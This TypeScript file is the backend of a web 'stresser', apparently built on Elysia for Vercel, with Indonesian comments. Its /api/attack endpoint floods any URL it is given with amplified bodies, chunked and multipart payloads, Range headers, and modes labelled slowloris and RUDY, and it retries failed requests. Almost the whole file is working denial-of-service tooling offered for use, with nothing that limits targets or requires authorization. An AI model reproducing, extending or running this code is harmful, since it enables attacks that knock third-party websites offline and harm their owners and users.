import { Elysia, t } from 'elysia';

// ======================== Helper Functions ========================
function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  // pola acak menghindari kompresi
  const chunk = 'X'.repeat(1024);
  const repeat = Math.floor(size / chunk.length);
  const remainder = size % chunk.length;
  return chunk.repeat(repeat) + chunk.slice(0, remainder);
}

// In-memory active users (simple, non-persistent)
const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

// ======================== Core Attack Function ========================
interface AttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  httpVersion: string;
  keepAlive: boolean;
  useProxy: boolean;
  proxyList: string[];
  attackType: string;
  amplifyKB: number;
}

async function executeAttack(params: AttackParams): Promise<any> {
  let {
    url, method, headers, body,
    timeout, retryCount, randomDelay,
    keepAlive, useProxy, proxyList,
    attackType, amplifyKB
  } = params;

  let finalMethod = method.toUpperCase();
  let finalUrl = url;
  let finalHeaders = { ...headers };
  let finalBody = body || '';
  let useBody = false;

  // Random delay sebelum request (simulasi)
  if (randomDelay > 0) {
    await new Promise(r => setTimeout(r, Math.random() * randomDelay));
  }

  // Amplification payload
  const ampPayload = generateAmplificationPayload(amplifyKB);

  // Modifikasi berdasarkan attack type
  switch (attackType) {
    case 'range':
      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
      break;
    case 'chunked':
      finalBody = body + ampPayload;
      useBody = true;
      finalHeaders['Transfer-Encoding'] = 'chunked';
      break;
    case 'multipart':
      const boundary = `----WebKitFormBoundary${randomString(16)}`;
      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
      finalBody = part;
      useBody = true;
      break;
    case 'slowloris':
      finalHeaders['Connection'] = 'keep-alive';
      // tidak tambah body, hanya keep-alive
      break;
    case 'rudy':
      // delay 2 detik (simulasi slow POST)
      await new Promise(r => setTimeout(r, 2000));
      finalBody = body + ampPayload;
      useBody = true;
      break;
    default: // normal
      finalBody = body + ampPayload;
      useBody = true;
  }

  // Aturan untuk GET jika amplification besar
  if (amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
    finalMethod = 'POST';
    useBody = true;
    finalBody = ampPayload;
  } else if (amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD')) {
    const separator = finalUrl.includes('?') ? '&' : '?';
    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
    useBody = false;
  }

  // Header tambahan wajib
  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
  else finalHeaders['Connection'] = 'close';

  // Proxy support sederhana (lewat fetch, bisa ditambahkan)
  // Untuk prod, bisa gunakan `https-proxy-agent` tetapi di Vercel terbatas.
  // Kita lewati proxy di sini untuk memudahkan (bisa ditambahkan nanti).

  const fetchOptions: any = {
    method: finalMethod,
    headers: finalHeaders,
    signal: AbortSignal.timeout(timeout),
  };
  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
    fetchOptions.body = finalBody;
  }

  let lastError: any = null;
  let lastStatusCode = 0;
  let responseSize = 0;
  let responsePreview = '';
  let durationMs = 0;
  let retriesUsed = 0;

  const baseDelay = 100;
  for (let attempt = 0; attempt <= retryCount; attempt++) {
    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
    const start = Date.now();
    try {
      const res = await fetch(finalUrl, fetchOptions);
      durationMs = Date.now() - start;
      lastStatusCode = res.status;
      const buffer = await res.arrayBuffer();
      responseSize = buffer.byteLength;
      const text = new TextDecoder().decode(buffer);
      responsePreview = text.slice(0, 500);
      if (res.status >= 200 && res.status < 400) {
        retriesUsed = attempt;
        break;
      }
    } catch (err: any) {
      durationMs = Date.now() - start;
      lastError = err;
    }
  }

  const success = lastStatusCode >= 200 && lastStatusCode < 400;
  const errorMsg = lastError ? lastError.message : '';

  return {
    success,
    statusCode: lastStatusCode,
    durationMs,
    error: errorMsg,
    retries: retriesUsed,
    responseSize,
    responseBody: responsePreview,
  };
}

// ======================== Elysia Server ========================
const app = new Elysia()
  // Middleware global (opsional)
  .onBeforeHandle(({ request }) => {
    // CORS sederhana
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }
  })
  // Endpoint status
  .get('/api/status', () => ({
    status: 'ok',
    message: 'Web Stresser Ultimate - Elysia Engine',
    version: '13.0.0',
  }))
  // Endpoint attack
  .post('/api/attack', async ({ body }) => {
    const result = await executeAttack(body as AttackParams);
    return result;
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      httpVersion: t.String(),
      keepAlive: t.Boolean(),
      useProxy: t.Boolean(),
      proxyList: t.Array(t.String()),
      attackType: t.String(),
      amplifyKB: t.Number(),
    }),
  })
  // Endpoint heartbeat untuk active users
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

// ======================== Handler untuk Vercel ========================
// Kita ekspor handler untuk digunakan oleh Vercel
// Karena Vercel menggunakan format serverless, kita perlu menyesuaikan.
// Kita akan buat export default yang mengembalikan handler yang sesuai.
// Atau kita bisa gunakan adapter @elysiajs/vercel

import { vercel } from '@elysiajs/vercel';
export const handler = vercel(app);

// ======================== Jalankan jika bukan di Vercel ========================
if (process.env.NODE_ENV !== 'production') {
  app.listen(3000);
  console.log('🦊 Web Stresser Elysia running on http://localhost:3000');
}
